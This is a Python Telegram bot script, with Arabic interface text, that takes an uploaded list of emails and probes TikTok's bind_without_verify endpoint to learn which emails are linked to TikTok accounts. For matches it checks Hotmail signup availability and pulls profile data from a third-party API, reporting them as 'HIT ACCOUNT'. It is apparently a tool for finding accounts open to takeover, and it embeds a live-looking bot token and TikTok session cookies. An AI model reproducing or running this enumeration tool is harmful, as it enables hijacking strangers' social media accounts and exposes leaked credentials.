import requests
import random
import os
import telebot
from telebot import types
from hashlib import md5
import user_agent
import requests
import uuid
from uuid import *
import re
from re import search
from user_agent import generate_user_agent as dd
while True:
    try:
        headers = {
    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
    'accept-language': 'en-US,en;q=0.9',
    'upgrade-insecure-requests': '1',
    'user-agent': 'Mozilla/5.0 (iPhone; CPU iPhone OS 16_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.6 Mobile/15E148 Safari/604.1',
}
        response = requests.get('https://signup.live.com/signup', headers=headers)
        canary=str.encode(response.text.split('"apiCanary":"')[1].split('"')[0]).decode("unicode_escape").encode("ascii").decode("unicode_escape").encode("ascii").decode("ascii")
        amsc=response.cookies.get_dict()['amsc']
        cookies = {
    'amsc': amsc,
}
        headers = {
    'accept': 'application/json',
    'accept-language': 'en-US,en;q=0.9',
    'canary': canary,
    'content-type': 'application/json; charset=utf-8',
    'origin': 'https://signup.live.com',
    'referer': 'https://signup.live.com/',
    'user-agent': 'Mozilla/5.0 (iPhone; CPU iPhone OS 16_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.6 Mobile/15E148 Safari/604.1',
}
        json_data = {
    'clientExperiments': [
        {
            'parallax': 'enableplaintextforsignupexperiment',
            'control': 'enableplaintextforsignupexperiment_control',
            'treatments': [
                'enableplaintextforsignupexperiment_treatment',
            ],
        },
    ],
}
        response = requests.post(
    'https://signup.live.com/API/EvaluateExperimentAssignments',
    cookies=cookies,
    headers=headers,
    json=json_data,
).json()
        canary=response['apiCanary']
        break
    except:''
Zaid1 = types.InlineKeyboardButton(text ="Click To Start ⚡",callback_data = "Zaid1")

bot=telebot.TeleBot("7360050085:AAFMq-9C_D49QfgUlA54sJDK5SGqFkjs7x8")
@bot.message_handler(commands=['start','s'])
def mes(message):
	jj = types.InlineKeyboardMarkup()
	jj.add(Zaid1)
	bot.send_message(message.chat.id,'<strong>اهلا وسهلا عزيزي المستخدم \n عليك الان اختيار القسم الذي يناسبك\n <s>وان واجهتك اي مشكله لاتتردد في مراسلتي \n @instagram_exe</s>\n</strong>',parse_mode='HTML',reply_markup=jj)
@bot.callback_query_handler(lambda call:True)
def call(call):
			if call.data == "Zaid1":
			     messag=bot.send_message(chat_id=call.message.chat.id,text=' *Send File .txt :*',parse_mode='Markdown')
			     bot.register_next_step_handler(messag,maho,messag.id)
		
ins=0
ins1=0
hot=0
hot1=0
jaseb=0
def maho(message,id):
	global ins,ins1,hot,hot1,jaseb
	uid=str(uuid.uuid4())
	
	import time
	from time import sleep
	try:
		filename = message.document.file_name
		file_info = bot.get_file(message.document.file_id)
		username = bot.download_file(file_info.file_path)		
		with open(filename, 'wb') as (King):
			King.write(username)
	except:
		bot.send_message(message.chat.id, f"<strong>Error in File</strong>",parse_mode="html")
	try:
		file = open(filename,'r').read().splitlines()
		mahodii = len(open(filename).read().splitlines())
	except FileNotFoundError as error:
		bot.send_message(message.chat.id, f"<strong>Error </strong>",parse_mode="html")
	bot.send_message(message.chat.id, f"<strong>تــــــم بــــــدأ الـــــــفـــــحـــــص</strong>",parse_mode="html")
	for email in file:
		jaseb+=1
		if '@' in email:
			email=email.split('@')[0]+"@gmail.com"
		email=email
		sis = str(uuid.uuid4()).replace('-', '')
		url =f'https://api22-normal-c-alisg.tiktokv.com/passport/email/bind_without_verify/?passport-sdk-version=19&iid=7372841843832473349&device_id=7194351170030650885&ac=WIFI&channel=googleplay&aid=1233&app_name=musical_ly&version_code=310503&version_name=31.5.3&device_platform=android&os=android&ab_version=31.5.3&ssmix=a&device_type=Infinix+X6816&device_brand=Infinix&language=ar&os_api=30&os_version=11&openudid=3293d1a6e9361cb7&manifest_version_code=2023105030&resolution=720*1568&dpi=303&update_version_code=2023105030&_rticket=1722418820230&is_pad=0&current_region=IQ&app_type=normal&sys_region=IQ&mcc_mnc=41805&timezone_name=Asia%2FBaghdad&carrier_region_v2=418&residence=IQ&app_language=ar&carrier_region=IQ&ac2=wifi5g&uoo=0&op_region=IQ&timezone_offset=10800&build_number=31.5.3&host_abi=arm64-v8a&locale=ar&region=IQ&content_language=ar%2C&ts=1722418819&cdid=556d8162-2721-4760-a509-a92b3cf27738&support_webview=1&cronet_version=2fdb62f9_2023-09-06&ttnet_version=4.2.152.11-tiktok&use_store_region_cookie=1'
		headers = {
    "Host": "api22-normal-c-alisg.tiktokv.com",
    "Content-Length": "95",
    "Cookie": (
        "passport_csrf_token=98153892f65b8d33f0fc4ffe571fe6ff; "
        "passport_csrf_token_default=98153892f65b8d33f0fc4ffe571fe6ff; "
        "d_ticket=9281ab6b344229e79a37b09d997ffd31c1a0f; "
        "multi_sids=7276401311359534085%3A14a2ae47be8dc51939df2969e4159dae%7C7320680702445503493%3A7a7e5835dfc5299e7ac584e090f6e8e2; "
        "cmpl_token=AgQQAPOGF-RPsLTEFtdG9108-bbhdjiI_4csYNYVRg; "
        "uid_tt=2507bbf000c73643b0480fdda21ecfd3015ddb85664c0a9ec8744a812eb35856; "
        "uid_tt_ss=2507bbf000c73643b0480fdda21ecfd3015ddb85664c0a9ec8744a812eb35856; "
        "sid_tt={sis}; "
        "sessionid={sis}; "
        "sessionid_ss={sis}; "
        "store-country-code=tr; "
        "store-country-code-src=uid; "
        "install_id=7372841843832473349; "
        "ttreq=1$95ba7cef3ab3446401e85f477fec283b1f0356ed; "
        "tt-target-idc-sign=znspePrEB2B5KD8K2lCDdggj4Lrw0uZD8o8bYY-w9vx1Z9klJbqvQgGeyl3E8sUGqwqHik_mH1KG6A5VVp__l3LlnWqVrDfjEzg9pcMtVEorYAHJ6Toep-EcMgXE-xS-3cOJwT1Qf5BUZiBoSeg0tnnZBVNK1JsWC-ntQlEGynwHnHW9i027cg1PQ3-umOPXjgbV1OEixU38LwPGQbJWkuX7v8RyMxVp3THNii4nXtbAvhBR7bm_o1VhlMlMn40SQuT9R8yWkQc6RL-HjDh_vLmUg4u1cbQddaqFaV9_m3xSMN96XIWp6MnyF052aO4xZHu9FKbDv_at-nQYCGW-cQKbnnyE69dDs0TE5kW9UT8reh6ZBsjJksItUaixkcAXkyMmkZkceMyRDkUvzTQm2PrsZP9QaKFGKnJJZx54L5wXWJfvRVQgvi0Ww3yzNbSo5h_k989r0nnMBlO8ukkfznwf5KrceuLTfncX1WQ9LVQkzQUhhmv9OOpgCdekXT5C; "
        "store-idc=alisg; "
        "tt-target-idc=alisg; "
        "odin_tt=4dfb813064a0a02517fb0dd3c1009e809bf0ce448947afa034d0e32c795874310203125b5dbae1bc50184a186676c5036593fa5d3ac1d8bff3c8fd7eec825de0b6faf9abdc1bdba28833e68fef89b1f1; "
        "sid_guard=14a2ae47be8dc51939df2969e4159dae%7C1722418253%7C15552000%7CMon%2C+27-Jan-2025+09%3A30%3A53+GMT; "
        "msToken=-7MZX1FGwui41BUSmMF7rmPZte5XSTuOPjeS9D4x3s_4H_ipjHFhhVAgIwDftSWW_3gcy5E2dlCVmid0AQKv9VxfDjtlODra8cMmfK67iolTKbCX_MU0YxgpWnM="
    ),
    "x-tt-multi-sids": "7276401311359534085%3A14a2ae47be8dc51939df2969e4159dae%7C7320680702445503493%3A7a7e5835dfc5299e7ac584e090f6e8e2",
    "sdk-version": "2",
    "x-bd-kmsv": "0",
    "x-tt-token": "0314a2ae47be8dc51939df2969e4159dae04ef342ee9f3bc17179723f2a65bf392603ac44a608f46b8107ebacfd96f2593ae1b301551fa2740d8ce6ca3ab08b9cd60ca9fbb4fddfb32f2ea68c016c71a8495cd41c7d712c40219d6948fe23f6866220-1.0.1",
    "x-ss-req-ticket": "1722418820234",
    "multi_login": "1",
    "x-tt-passport-csrf-token": "98153892f65b8d33f0fc4ffe571fe6ff",
    "passport-sdk-version": "19",
    "x-tt-dm-status": "login=1;ct=1;rt=1",
    "x-vc-bdturing-sdk-version": "2.3.3.i18n",
    "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
    "x-ss-stub": "EF371AB22B36112B4E3777D59B57E7BF",
    "x-ss-dp": "1233",
    "x-tt-trace-id": "00-082976481063d778459717c605a804d1-082976481063d778-01",
    "User-Agent": "com.zhiliaoapp.musically/2023105030 (Linux; U; Android 11; ar_IQ; Infinix X6816; Build/RP1A.200720.011; Cronet/TTNetVersion:2fdb62f9 2023-09-06 QuicVersion:bb24d47c 2023-07-19)",
    "Accept-Encoding": "gzip, deflate, br",
    "x-argus": "hYHSZacQ+SDgjlhp+GYTPATrp4KSxeMsHQySzlh5C4d7w07Cy/3kgo5M8Z2xffqwtvplj4D9mpyLjkrSxhYMrnMxuUo+zjWEC1vnuYSJ6SCnx3jNNrpAMGoJLptuSLDI32yTtCAF6I2CRxlfM3sDQFE++w5/cLMuNPH7oZMoC7hdF+oSimYO1yKIofoIa42nGjcHeES/wlmeYELVLE8jP7Zv9Y96TnziC3CLUL5rgwNisVnl+myJ7Om7f1ee/NEITKCB02v6dWxBdevWv6YU8xbar/XFgay1xjOqau6hAhBfl2zlGLI2GCcFuO0awp/76qFrUVspD5kJFIknREqMZuBZc7XwrGL1zBG2i2dLJ0L8xlf7nnXNJDcHaYJN/k2fgk20670sTHMwSU/2n3qjuoFnlmRvBtkbK9aZhXK6UsZBc7wfXFGtvo7mMEFNMx0bGBXeV0W3nMFUEBvQ8DSyz1sR8cX/TgcXki8fqv66hzqv7gKnoCpVg4DJLPX8BCoaCmbF8E8wY2I8LINdnUnCS171hAApx2OVCtdRChfZO2vm3aVH3FSpLZ7+3IiFmeFFqNnSiP3WFGPkZLjQzLcryRGN6okMTWYmzI8WEmD917+0rCVT1BGBeaz7y6376Hf0oaA=",

    "x-gorgon": "8404d0be100059d8c5deec6af320f9083a816ca0b153a10453d5",
    "x-khronos": "1722418817",
    "x-ladon": "AjUiHZeEpusLBby98MCwh8Po6zMm5xpdn8owe0nCNu1wuUYq"
}
		data = {
    "account_sdk_source": "app",
    "multi_login": "1",
    "email_source": "9",
    "email": email,
    "mix_mode": "1"
}
		res = requests.post(url,headers=headers,data=data).text
		if "فشل في الربط، تم ربط صندوق البريد بالحساب الآخر"in res:
			ins+=1
			try:
			 cookies = {
    'amsc': amsc,
}
			 headers = {
    'accept': 'application/json',
    'accept-language': 'en-US,en;q=0.9',
    'canary': canary,
    'content-type': 'application/json; charset=utf-8',
    'origin': 'https://signup.live.com',
    'referer': 'https://signup.live.com/',
    'user-agent': 'Mozilla/5.0 (iPhone; CPU iPhone OS 16_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.6 Mobile/15E148 Safari/604.1',
}
			 json_data = {
    'signInName': email,
}
			 response = requests.post('https://signup.live.com/API/CheckAvailableSigninNames', cookies=cookies, headers=headers, json=json_data).text
			 if 'g'=='g':
			 #if '"isAvailable":true' in response:
			 	hot+=1
			 	if '@' in email:
			 		user=email.split('@')[0]
			 	else:
			 		user=user
			 	headers = {
      'Host': 'www.woodrowpoe.top',
      'Connection': 'keep-alive',
      # 'Content-Length': '13',
      'package': 'woodrowpoe.tik.realfans',
      'apptype': 'android',
      'User-Agent': 'Mozilla/5.0 (Linux; Android 13; ANY-LX2 Build/HONORANY-L22CQ; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/124.0.6367.124 Mobile Safari/537.36',
      'Content-Type': 'application/x-www-form-urlencoded;charset=UTF-8',
      'idfa': '6160fb46-9862-4d44-95b9-b1911283231f',
      'Accept': 'application/json, text/plain, */*',
      'version': '1.1',
      'Origin': 'http://www.woodrowpoe.top',
      'X-Requested-With': 'woodrowpoe.tik.realfans',
      'Referer': 'http://www.woodrowpoe.top/h5_v5/',
      'Accept-Language': 'ar-IQ,ar;q=0.9,en-IQ;q=0.8,en-US;q=0.7,en;q=0.6',
    }
			 	data = {
      'username': user,
    }

			 	response = requests.post('http://www.woodrowpoe.top/api/v1/tikTokGetUserProfileInfo', headers=headers, data=data).json()
			 	id = response['data']['pk']
			 	user = user
			 	name = response['data']['nickname']
			 	folon = response['data']['followingCount']
			 	folos = response['data']['followerCount']
			 	lik =  response['data']['heartCount']
			 	vid = response['data']['videoCount']
			 	priv = response['data']['isPraise']
			 	ff = (f'''
𝐇𝐈𝐓 𝐀𝐂𝐂𝐎𝐔𝐍𝐓 𝐓𝐈𝐊𝐓𝐎𝐊
═══════════════════
𝙽𝙰𝙼𝙴 : {name}
𝚄𝚂𝙴𝚁𝙽𝙰𝙼𝙴 : {user}
𝙶𝙼𝙰𝙸𝙻 : {email}
𝙵𝙾𝙻𝙻𝙾𝚆𝙴𝚁𝚂 : {folos}
𝙵𝙾𝙻𝙻𝙾𝙸𝙽𝙶 : {folon}
𝙻𝙸𝙺𝙴 : {lik}
𝙸𝙳 : {id}
𝙿𝚁𝙸𝚅𝙰𝚃𝙴 : {priv}
𝚅𝙴𝙳𝙾 : {vid}
═══════════════════
   ''')
			 	bot.send_message(message.chat.id, ff)
			 else:
			 	hot1+=1
			except:''
		else:
			ins1+=1
		if ins1 % 42 == 0:
			bot.send_message(message.chat.id,f"Hit : {hot}\nBad In tiktok {ins1}\nBad in HotMail {hot1}\nGood in tiktok {ins}\nChecked : {jaseb}")
			if mahodii==jaseb:
				bot.send_message(message.chat.id,'تـــم انـــتــهاء الـــفحــــص')
				os.remove(file)
bot.infinity_polling()
